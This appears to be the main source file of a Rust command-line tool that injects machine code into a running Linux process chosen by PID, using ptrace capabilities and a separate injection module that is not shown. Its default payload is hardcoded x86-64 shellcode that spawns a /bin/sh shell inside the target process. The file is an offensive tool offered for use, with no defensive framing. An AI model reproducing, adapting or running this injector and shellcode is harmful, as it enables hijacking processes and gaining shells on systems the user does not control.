#[macro_use]
extern crate clap;

mod injection;
use caps::{CapSet, Capability};
use std::fs::File;
use std::io::Read;
use std::process::exit;

fn main() {
    let yaml = load_yaml!("options.yml");
    let args = clap::App::from_yaml(yaml).get_matches();
    let target_pid = args
        .value_of("pid")
        .unwrap()
        .parse::<i32>()
        .unwrap_or_else(|e| {
            eprintln!("received the invalid pid. {}", e);
            println!("{}", args.usage());
            exit(1);
        });

    let pid_max = procfs::sys::kernel::pid_max().unwrap();
    if target_pid == 0 || target_pid > pid_max {
        eprintln!("received the invalid pid. (pid_max is {})", pid_max);
        println!("{}", args.usage());
        exit(1);
    }

    if !caps::has_cap(None, CapSet::Permitted, Capability::CAP_SYS_PTRACE).unwrap() {
        eprintln!("You need CAP_SYS_PTRACE!!");
        exit(1);
    }

    let code = match args.value_of("code") {
        Some(path) => {
            let mut v = Vec::new();
            File::open(path)
                .unwrap_or_else(|e| {
                    eprintln!("{}: {}", path, e);
                    exit(1);
                })
                .read_to_end(&mut v)
                .unwrap();
            v
        }
        None => {
            b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" //\x00\x72\x00\x2f\x70"
                .iter()
                .map(|x| *x)
                .collect::<Vec<u8>>()
        }
    };
    let injector = injection::Injector::new(target_pid, code).unwrap_or_else(|e| {
        eprintln!("{}", e);
        exit(1)
    });
    if let Err(e) = injector.inject(args.is_present("verbose")) {
        eprintln!("{}", e);
    }
}
